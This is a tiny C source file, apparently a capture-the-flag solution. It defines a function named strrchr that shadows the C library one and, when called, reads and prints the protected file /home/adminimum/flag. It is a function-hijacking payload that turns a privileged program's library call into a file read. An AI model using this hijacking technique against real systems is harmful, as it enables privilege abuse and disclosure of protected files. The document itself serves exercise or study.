#include <stdlib.h>
#include <stdio.h>
void strrchr()
{
	FILE *f = fopen("/home/adminimum/flag", "rb");
	char buffer[1024]={0};
	fread(buffer, 1, 1024, f);
	puts(buffer);
}
